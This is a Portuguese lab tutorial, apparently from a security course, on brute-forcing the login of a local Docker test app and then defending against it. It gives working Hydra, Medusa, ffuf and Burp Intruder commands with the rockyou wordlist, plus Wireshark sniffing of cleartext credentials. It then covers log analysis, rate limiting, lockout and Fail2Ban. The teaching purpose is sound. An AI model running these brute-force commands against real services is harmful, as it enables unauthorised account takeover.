Configurando o Ambiente

⚠ Aviso ético — leia antes de começar

Esta atividade é realizada em ambiente isolado e controlado (Docker local, na sua própria máquina). É proibido usar estas técnicas em sistemas reais sem autorização. Acesso não autorizado a sistemas é crime — Lei nº 12.737/2012.

curl
reconhecimento manual

O que é e por que usar primeiro: O curl faz requisições HTTP pelo terminal. Antes de qualquer ataque automatizado, precisamos entender como a aplicação responde — qual texto ela retorna quando a senha está errada. Esse texto é chamado de FAIL_STRING e todas as ferramentas de bruteforce precisam dele para diferenciar um login falho de um bem-sucedido.

  • 1

    Testar com senha errada e observar a resposta

    Execute o comando abaixo. O -s suprime a barra de progresso, -X POST define o método, -d é o corpo da requisição e -w imprime o status HTTP no final.

    curl — senha errada
    curl -s -X POST http://localhost:3000/login \
  -d 'username=admin&password=senhaerrada' \
  -w '\nStatus HTTP: %{http_code}\n'
    saída esperada
    {"success":false,"message":"Credenciais inválidas."}
Status HTTP: 401
    📌 Anote agora — você vai usar nas próximas ferramentas!

    O texto Credenciais inválidas. é o seu FAIL_STRING.

    O HTTP 401 = "não autorizado" — confirma que o login falhou.

    Nas próximas ferramentas (Hydra, Medusa, ffuf), você vai informar esse texto para que elas saibam identificar quando a senha está errada.

  • 2

    Comparar com a resposta de login correto

    O professor vai informar a senha para fins de comparação apenas neste momento:

    curl — senha correta
    curl -s -X POST http://localhost:3000/login \
  -d 'username=admin&password=SENHA_CORRETA' \
  -w '\nStatus HTTP: %{http_code}\n'
    saída quando o login funciona
    {"success":true,"message":"Login realizado com sucesso! Bem-vindo, admin."}
Status HTTP: 200
    💡 O que muda entre falha e sucesso?

    Status muda de 401 para 200.

    O corpo da resposta não contém o FAIL_STRING.

    Essas são as duas formas que as ferramentas de bruteforce usam para detectar que a senha foi encontrada.

  • 3

    Ver os cabeçalhos completos da requisição (opcional — revela tecnologia do servidor)

    curl — cabeçalhos HTTP
    curl -v -X POST http://localhost:3000/login \
  -d 'username=admin&password=teste' 2>&1 | grep -E '< |> '
    parte da saída — > = enviado pelo cliente, < = recebido do servidor
    > POST /login HTTP/1.1
> Content-Type: application/x-www-form-urlencoded
< HTTP/1.1 401 Unauthorized
< X-Powered-By: Express
🔱
Hydra
bruteforce principal

O que é: Uma das ferramentas de força bruta mais usadas em pentests. Testa automaticamente cada senha da wordlist contra o formulário de login, usando múltiplas conexões paralelas (threads) para ser mais rápido.

  • 1

    Executar o Hydra contra o login da aplicação

    Substitua Credenciais inválidas. pelo texto exato que você anotou no passo do curl. Esse é o FAIL_STRING.

    hydra — ataque HTTP POST
    hydra \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  localhost \
  http-post-form \
  '/login:username=^USER^&password=^PASS^:Credenciais inválidas.' \
  -t 4 -V -f
    ParâmetroO que faz — em detalhe
    -l adminUsuário fixo para testar. Já sabemos que o login é "admin", então fixamos ele e deixamos o Hydra variar só a senha.
    -P rockyou.txtArquivo com a lista de senhas. O Hydra vai testar cada linha como senha, em sequência.
    localhostEndereço IP ou hostname do alvo. Poderia ser um IP como 192.168.1.10.
    http-post-formMódulo do Hydra para formulários web que usam método POST. Existe também http-get-form para formulários GET.
    '/login:...:FAIL'Três partes separadas por : — (1) path do endpoint, (2) corpo da requisição com placeholders, (3) texto que indica falha.
    ^USER^ / ^PASS^Marcadores que o Hydra substitui automaticamente pelo usuário e senha atual a cada tentativa.
    -t 44 threads paralelas (4 tentativas simultâneas). Aumentar pode acelerar, mas também pode causar erros ou disparar alertas.
    -VVerbose: mostra cada tentativa na tela. Retire para rodar mais rápido sem exibir tudo.
    -fPara imediatamente ao encontrar a primeira senha válida.
  • 2

    Aguardar e identificar o resultado

    Você verá tentativas passando na tela. Quando a senha for encontrada, o Hydra destaca em verde:

    saída quando a senha é encontrada
    [80][http-post-form] host: localhost   login: admin   password: dragon
1 of 1 target successfully completed, 1 valid password found
    ✓ O que anotar agora

    A senha encontrada, o tempo total e a quantidade aproximada de tentativas. Você vai comparar isso com as outras ferramentas.

  • 3

    Experimentar com mais threads para comparar velocidade

    hydra — 16 threads
    hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost \
  http-post-form '/login:username=^USER^&password=^PASS^:Credenciais inválidas.' \
  -t 16 -f # sem -V para rodar mais rápido
    🤔 Reflexão

    Ficou mais rápido com 16 threads? Houve erros de conexão? Por que um número muito alto de threads pode ser contraproducente em um ataque real?

Medusa
bruteforce alternativo

O que é: Ferramenta de bruteforce com foco em paralelismo e suporte a dezenas de protocolos. O objetivo aqui é comparar com o Hydra — na prática um profissional de segurança conhece múltiplas ferramentas para o mesmo fim.

  • 1

    Resetar o estado da aplicação antes de testar

    Isso limpa contadores internos que possam ter sido gerados pelo Hydra:

    terminal
    curl -X POST http://localhost:3000/reset
  • 2

    Executar o Medusa

    medusa — ataque HTTP
    medusa \
  -h localhost \
  -u admin \
  -P /usr/share/wordlists/rockyou.txt \
  -M web-form \
  -m 'FORM:/login:username=^USER^&password=^PASS^:Credenciais inválidas.' \
  -t 2 -v 6 -f
    ParâmetroO que faz
    -h localhostHost alvo
    -u adminUsuário fixo
    -P rockyou.txtWordlist de senhas
    -M web-formMódulo para formulários web
    -m 'FORM:...'Configuração do módulo: path, parâmetros e fail string. Mesmo conceito do Hydra, sintaxe diferente.
    -t 22 threads paralelas
    -v 6Nível de verbosidade máximo — mostra tudo
    -fPara ao encontrar a primeira senha válida
  • 3

    Comparar Hydra vs Medusa e preencher a tabela

🔍
Burp Suite
intercepção + intruder

O que é: Suíte completa de segurança web usada por pentesters profissionais. Funciona como um proxy entre o navegador e o servidor — intercepta, exibe e permite modificar cada requisição. O módulo Intruder automatiza ataques em requisições capturadas.

  • 1

    Abrir o Burp Suite

    Ao abrir clique em "Temporary project" → "Use Burp defaults" → "Start Burp". Aguarde carregar.

  • 2

    Configurar o Firefox para usar o proxy do Burp

    O Burp escuta na porta 8080 por padrão. Você precisa dizer ao navegador para enviar o tráfego por lá.

    No Firefox: Menu (≡) → Configurações → busque "proxy" na barra de busca → Configurações de Conexão → marque "Configuração manual de proxy":

    ⚙ Dados do proxy

    Proxy HTTP: 127.0.0.1   Porta: 8080

    Marque: "Usar este proxy para todos os protocolos"

    Clique OK para salvar.

    ⚠ Lembrete importante

    Após terminar a atividade no Burp, volte nessa tela e selecione "Sem proxy". Caso contrário o Firefox vai parar de funcionar com a internet normal.

  • 3

    Ativar a interceptação no Burp e capturar o login

    No Burp Suite → aba Proxy → clique em "Intercept is off" para ativar (fica escrito "Intercept is on" quando ativo).

    No Firefox, acesse http://localhost:3000 e tente fazer login com qualquer credencial (ex: admin / teste). O navegador vai "travar" — é normal, a requisição está segura no Burp.

    💡 Por que o navegador travou?

    O Burp segurou a requisição para você analisar. Você precisa clicar em "Forward" para liberar e o navegador continua. Isso é útil para modificar dados em tempo real antes de enviar.

  • 4

    Enviar a requisição capturada para o Intruder

    No painel do Burp, você verá a requisição capturada. Clique com o botão direito nela → "Send to Intruder". Depois clique em "Forward" para liberar o navegador.

    requisição que você verá no Burp
    POST /login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

username=admin&password=teste
  • 5

    Configurar os Positions no Intruder

    Vá na aba Intruder (topo) → sub-aba Positions.

    Clique em "Clear §" para remover todos os marcadores automáticos. Depois selecione com o mouse apenas o valor da senha (o texto teste) e clique em "Add §". O resultado deve ficar assim:

    corpo da requisição com marcador correto
    username=admin&password=§teste§
    💡 O que são esses § §?

    São marcadores de posição. O Intruder vai substituir o que estiver entre eles por cada payload (senha) da lista. É o equivalente ao ^PASS^ do Hydra.

    Verifique que o Attack type está em "Sniper" — é o modo que usa uma wordlist em uma posição.

  • 6

    Carregar a wordlist na aba Payloads

    Aba Payloads → Payload type: Simple list → botão Load...

    💡 Use uma mini wordlist para o Burp rodar rápido

    O rockyou.txt completo tem 14 milhões de senhas — o Burp Community (versão gratuita) é mais lento. Crie uma lista menor:

    criar mini wordlist com as 200 primeiras senhas
    head -200 /usr/share/wordlists/rockyou.txt > /tmp/mini.txt

    Depois carregue o arquivo /tmp/mini.txt no Burp.

  • 7

    Iniciar o ataque e analisar os resultados

    Clique em "Start attack" (botão no canto superior direito). Uma janela nova vai abrir mostrando cada tentativa com status e tamanho da resposta.

    Quando o ataque terminar, clique na coluna "Length" para ordenar. A linha com tamanho diferente das outras é o login bem-sucedido:

    resultado — ordene pela coluna Length para encontrar a senha
    Req   Payload     Status  Length
1     123456      401     42
2     password    401     42
3     dragon      200     68  ← tamanho diferente = login ok!
4     12345       401     42
    ✓ Por que o Length é diferente?

    Login falho → resposta: {"success":false,"message":"Credenciais inválidas."} — sempre o mesmo tamanho (42 bytes).

    Login ok → resposta: {"success":true,"message":"Login realizado com sucesso! Bem-vindo, admin."} — mensagem maior (68 bytes).

    Essa diferença de tamanho é a assinatura visual do sucesso no Intruder.

⚡
ffuf
fuzzing ultrarrápido

O que é: O ffuf (Fuzz Faster U Fool) é uma das ferramentas mais rápidas para fuzzing web. Muito usado para descoberta de diretórios ocultos e parâmetros, mas também eficaz para bruteforce de senhas. O objetivo principal aqui é comparar a velocidade com o Hydra.

  • 1

    Executar o ffuf para bruteforce de senha

    No ffuf, a wordlist é passada com :FUZZ no final, e o marcador FUZZ é colocado exatamente onde a senha deve ser substituída na requisição.

    ffuf — bruteforce HTTP POST
    ffuf \
  -w /usr/share/wordlists/rockyou.txt:FUZZ \
  -u http://localhost:3000/login \
  -X POST \
  -d 'username=admin&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fr 'Credenciais inválidas.' \
  -t 10 -mc all
    ParâmetroO que faz
    -w arquivo:FUZZDefine a wordlist e o nome do marcador. Onde FUZZ aparecer na requisição, será substituído pela senha atual.
    -uURL alvo completa
    -X POSTMétodo HTTP da requisição
    -d '...FUZZ'Corpo da requisição. FUZZ aqui é substituído pela senha a cada tentativa.
    -H 'Content-Type'Cabeçalho HTTP necessário para enviar dados de formulário corretamente.
    -fr 'texto'Filter Regexp — remove da exibição respostas que contenham esse texto. Só aparecem as respostas que NÃO contêm o FAIL_STRING, ou seja: apenas o login bem-sucedido.
    -t 1010 threads paralelas
    -mc allMostra todos os status codes, sem filtrar nenhum
  • 2

    Observar o relatório de velocidade

    O ffuf exibe no topo quantas requisições por segundo está fazendo. Compare com o Hydra visualmente.

    parte do cabeçalho de execução — observe req/sec
    :: Threads          : 10
:: Matcher          : Response status: all
:: Filter           : Regexp: Credenciais inválidas.
Progress: [200/14344391] :: Job [1/1] :: 843 req/sec ::
    🤔 Reflexão

    O ffuf foi mais rápido que o Hydra? Por quê mais threads não são sempre melhores? O que acontece se o servidor tiver limite de conexões simultâneas?

🦈
Wireshark
análise de tráfego

O que é: O Wireshark captura todos os pacotes de rede da interface selecionada e permite inspecionar o conteúdo de cada um. Vamos usá-lo para visualizar o tráfego gerado pelo ataque e entender a diferença crítica entre HTTP e HTTPS.

  • 1

    Abrir o Wireshark e selecionar a interface loopback

    Ao abrir, você verá uma lista de interfaces de rede com gráficos de atividade. Como a aplicação está no localhost, selecione a interface lo (loopback) — ela captura tráfego local.

    💡 Não achou a interface lo?

    Tente Loopback: lo ou a interface com menor atividade listada no início. Clique duas vezes para começar a capturar.

  • 2

    Aplicar filtro para ver só o tráfego da aplicação

    Na barra de filtro no topo, digite o filtro abaixo e pressione Enter:

    filtro Wireshark
    tcp.port == 3000 && http
    💡 O que esse filtro significa

    tcp.port == 3000 → só pacotes na porta da nossa aplicação

    http → só pacotes do protocolo HTTP (descarta TCP puro)

    && → as duas condições precisam ser verdadeiras ao mesmo tempo

  • 3

    Rodar o Hydra em outra janela enquanto observa o Wireshark

    Abra um segundo terminal e execute o Hydra. Observe o tráfego aparecendo no Wireshark em tempo real:

    segundo terminal — Hydra
    hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost \
  http-post-form '/login:username=^USER^&password=^PASS^:Credenciais inválidas.' \
  -t 4

    Após 20-30 segundos, pare o Hydra com Ctrl+C e pare a captura clicando no botão vermelho no Wireshark.

  • 4

    Inspecionar um pacote POST e ler a senha testada

    Clique em qualquer linha POST /login na lista de pacotes. No painel inferior, expanda "HTML Form URL Encoded". Você consegue ver a senha em texto claro?

    conteúdo visível dentro do pacote HTTP
    username=admin&password=dragon
    ⚠ Implicação crítica de segurança

    Com HTTP, qualquer pessoa na mesma rede consegue capturar e ler as senhas — inclusive a correta quando o login funciona.

    Com HTTPS, esses dados estariam criptografados e ilegíveis no Wireshark. O bruteforce ainda seria possível, mas o tráfego não poderia ser espionado.

    Isso é especialmente grave em redes Wi-Fi públicas sem HTTPS.

  • 5

    Ver estatísticas do ataque no Wireshark

    menus do Wireshark
    Statistics → HTTP → Requests     (conta quantas requisições por URL)
Statistics → IO Graphs           (gráfico de volume de tráfego ao longo do tempo)
    💡 O que o gráfico IO mostra

    Um pico grande de tráfego exatamente durante o período do ataque. Esse é o padrão que sistemas IDS/IPS (como Snort e Suricata) identificam automaticamente como bruteforce.

Etapa 1 — Análise dos Logs

Todo ataque de força bruta deixa rastros evidentes nos logs. Identificar esses padrões é a habilidade principal de um analista de segurança (SOC Analyst).

  • 1

    Ver os logs em tempo real enquanto o ataque acontece

    Em uma janela, rode o Hydra. Na outra, acompanhe os logs ao vivo:

    logs ao vivo do container
    docker logs app-brute --tail 50 --follow
# Pressione Ctrl+C para parar
    padrão de log durante ataque — repare na frequência absurda
    127.0.0.1 - [10:15:01] "POST /login HTTP/1.1" 401 42
127.0.0.1 - [10:15:01] "POST /login HTTP/1.1" 401 42
127.0.0.1 - [10:15:01] "POST /login HTTP/1.1" 401 42
127.0.0.1 - [10:15:02] "POST /login HTTP/1.1" 200 68  ← senha encontrada!
    💡 O que diferencia ataque de usuário legítimo no log?

    Um usuário esquecendo a senha tenta no máximo 3-5 vezes com intervalo de segundos entre cada tentativa.

    Um ataque gera dezenas ou centenas de tentativas do mesmo IP em menos de 1 segundo. Esse padrão é inconfundível.

  • 2

    Salvar e analisar os logs com comandos Linux

    análise de logs
    # 1. Salvar os logs em arquivo
docker logs app-brute > /tmp/access.log 2>&1

# 2. Contar total de tentativas de login
grep 'POST /login' /tmp/access.log | wc -l

# 3. Contar por IP — revela o atacante
grep 'POST /login' /tmp/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn

# 4. Ver User-Agent (Hydra e ffuf têm UA identificável)
grep 'POST /login' /tmp/access.log \
  | awk -F'"' '{print $6}' | sort -u

# 5. Ver horário de início e fim do ataque
grep 'POST /login' /tmp/access.log | awk '{print $4}' | head -1
grep 'POST /login' /tmp/access.log | awk '{print $4}' | tail -1
  • 3

    Acessar o arquivo de log mapeado no host (via volume Docker)

    O container salva os logs em arquivo dentro da pasta logs/ do projeto, acessível diretamente no seu sistema:

    log em arquivo — host
    tail -30 ~/lab-bruteforce/logs/access.log

Etapa 2 — Contramedida 1: Rate Limiting

O que é: Limita quantas requisições um IP pode fazer em uma janela de tempo. Acima do limite, o servidor responde com erro 429 Too Many Requests e ignora a requisição.

  • 1

    Verificar o estado atual — tudo desativado por padrão

    consultar configuração
    curl http://localhost:3000/status
    saída — defesas desligadas
    {"config":{"rateLimit":{"enabled":false},"lockout":{"enabled":false}}}
  • 2

    Ativar o Rate Limiting

    ativar
    curl -X POST http://localhost:3000/config \
  -d 'feature=rateLimit&value=true'
  • 3

    Tornar o limite mais restritivo (5 req por minuto por IP)

    ajustar limite
    curl -X POST http://localhost:3000/config \
  -d 'feature=maxReqs&value=5'
  • 4

    Rodar o Hydra novamente e observar o que acontece

    testar Hydra com rate limiting ativo
    hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost \
  http-post-form '/login:username=^USER^&password=^PASS^:Credenciais inválidas.' \
  -t 4 -V -f
    ✓ O que você deve ver

    O Hydra começa a receber erros HTTP 429. A mensagem muda para: "Muitas tentativas. Aguarde antes de tentar novamente."

    O ataque fica muito mais lento ou falha completamente.

    🤔 Reflexão

    O rate limiting impediu completamente o ataque? Um atacante com paciência poderia esperar a janela de 1 minuto e continuar tentando? Como tornar o rate limiting ainda mais eficaz?

Etapa 3 — Contramedida 2: Account Lockout

O que é: Após N tentativas falhas, a conta é bloqueada temporariamente. O servidor recusa qualquer tentativa para aquela conta por um período definido, independente do IP de origem.

  • 1

    Desativar o rate limiting e ativar o lockout

    Entender o tradeoff do account lockout

    ⚠ O lockout pode ser usado como arma

    Um atacante pode fazer 5 tentativas erradas intencionalmente para bloquear a conta do usuário legítimo — isso é um ataque de negação de serviço (DoS) por bloqueio de conta.

    Como mitigar esse risco:

    • CAPTCHA após 3 tentativas (humanos passam, bots não)
    • Notificar o usuário por e-mail quando a conta for bloqueada
    • Lockout progressivo (1min, 5min, 30min) em vez de fixo
    • Lockout por IP em vez de por conta

Etapa 4 — Contramedida 3: Fail2Ban

O que é: O Fail2Ban monitora arquivos de log em tempo real. Quando detecta um padrão suspeito (muitos erros 401 do mesmo IP), executa uma ação automática — normalmente adiciona uma regra no firewall (iptables) bloqueando o IP completamente.

  • 1

    Instalar e iniciar o Fail2Ban

    instalação
    sudo apt install -y fail2ban
sudo systemctl start fail2ban
fail2ban-client status # confirma que está rodando
  • 2

    Criar o filtro — define o padrão de log que indica ataque

    O filtro usa uma expressão regular (regex) para identificar linhas de log que indicam tentativa de login falha:

    abrir editor
    sudo nano /etc/fail2ban/filter.d/app-brute.conf

    Cole o conteúdo abaixo. Salve com Ctrl+O → Enter → Ctrl+X:

    conteúdo do filtro
    [Definition]
# <HOST> captura o IP da linha de log automaticamente
# A regex identifica: IP + POST /login + status 401
failregex = ^<HOST> .* POST /login .* 401
ignoreregex =
    💡 O que é <HOST>?

    É um placeholder especial do Fail2Ban que extrai automaticamente o endereço IP da linha de log. Cada vez que uma linha combinar com essa regex, o IP é registrado como uma tentativa falha.

  • 3

    Criar a "jail" — define ações e limites

    A jail conecta o filtro ao arquivo de log e define quando e por quanto tempo banir:

    abrir editor
    sudo nano /etc/fail2ban/jail.d/app-brute.conf
    conteúdo da jail
    [app-brute]
enabled  = true
filter   = app-brute
logpath  = /root/lab-bruteforce/logs/access.log
maxretry = 10    ; bane após 10 falhas no período
bantime  = 600   ; ban dura 600s (10 minutos)
findtime = 60    ; conta falhas dentro de 60 segundos
    ⚠ Ajuste o logpath!

    O caminho acima pode ser diferente na sua máquina. Verifique com:

    echo ~/lab-bruteforce/logs/access.log

    Use o caminho completo que aparecer no resultado.
